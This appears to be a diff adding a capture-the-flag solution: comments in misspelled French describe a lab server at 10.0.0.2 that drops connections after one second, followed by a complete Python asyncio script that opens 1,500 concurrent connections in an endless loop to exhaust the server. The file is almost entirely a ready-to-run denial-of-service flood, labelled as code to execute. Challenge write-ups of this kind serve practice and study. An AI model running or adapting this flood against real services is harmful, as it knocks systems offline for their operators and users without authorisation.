@@ -1,0 +1,39 @@
+# pour ce challenge le serveur .2 il ecoute les connexion est resoie 1024octet recv(1024) 
+# est puis la connexion est fermer apres une seconde ce qui echoue les attack simple 
+# car les connexion sur le serveur est fermer apres 1s alros les resouce il se reetulise
+# pour d autre connexions de notre attack . alros il faut etulise la demarche ou 
+# notre connexion des attack reste ouvert est on etulise la methode asynchrone avec 
+# le module asyncio pour cree notre connexion d une manierre parallaile est comme
+# ca meme si le serveur ferme les connexions apres 1 seconde notre attack il buffffff
+# le serveur .
+#---------------------------code a exectuer----------------------------------
+import asyncio
+
+TARGET_IP = "10.0.0.2"
+TARGET_PORT = 31337
+CONCURRENCY = 1500  # Nombre maximal de connexions simultanées souvent à 1024 ou 4096 
+
+async def aggressive_flood():
+    while True:
+        try:
+            # Ouvrir la connexion sans envoyer de données pour forcer le serveur à bloquer sur recv
+            reader, writer = await asyncio.open_connection(TARGET_IP, TARGET_PORT)
+            # Maintenir la socket ouverte pour monopoliser un processus / emplacement
+            await asyncio.sleep(1.5)
+            writer.close()
+            await writer.wait_closed()
+        except Exception:
+            # Réessayer instantanément en cas de saturation ou de rejet
+            await asyncio.sleep(0.001)
+
+async def main():
+    print(f"[*] Saturation agressive de {TARGET_IP}:{TARGET_PORT} avec {CONCURRENCY} tâches...")
+    tasks = [aggressive_flood() for _ in range(CONCURRENCY)]
+    await asyncio.gather(*tasks)
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\n[*] Arrêt de l'attaque.")
+#--------------------------------------------------------------------------------
